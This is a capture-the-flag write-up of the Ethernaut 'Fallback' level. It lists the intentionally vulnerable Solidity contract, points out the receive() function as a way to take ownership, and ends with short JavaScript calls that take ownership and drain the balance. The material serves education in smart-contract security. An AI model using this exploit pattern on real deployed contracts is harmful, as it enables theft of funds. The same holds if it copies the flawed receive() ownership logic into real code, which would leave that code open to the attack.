# Ethernaut Challenge #1: Fallback

**Objective:** Claim ownership of the contract and reduce its balance to 0.

**Contract Analysis:**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {
  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
    require(msg.sender == owner, "caller is not the owner");
    _;
  }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

**Vulnerabilities Found:**

1. **Line 26-28: contribute() ownership transfer**
   - If contribution > owner contribution, you become owner
   - But owner starts with 1000 ETH, so you need > 1000 ETH
   - Not practical

2. **Line 36-39: receive() fallback function**
   - `receive()` is called when ETH sent with empty calldata
   - Only requires: msg.value > 0 AND contributions[msg.sender] > 0
   - **If you have ANY contribution, sending ETH makes you owner!**

**Attack Path:**
1. Call `contribute()` with small amount (0.0001 ETH) - gets you in mapping
2. Send ETH directly to contract (triggers `receive()`) - become owner
3. Call `withdraw()` - drain contract

**Code Solution:**
```javascript
// 1. Get contribution
await contract.contribute({value: toWei('0.0001')})

// 2. Send ETH to trigger receive()
await sendTransaction({
  to: contract.address,
  value: toWei('0.0001')
})

// 3. Withdraw everything
await contract.withdraw()
```

**Lesson:** Fallback functions can be dangerous. Any ETH transfer with empty calldata can trigger unexpected state changes.

**Status:** Challenge understood. Ready to execute when wallet funded.
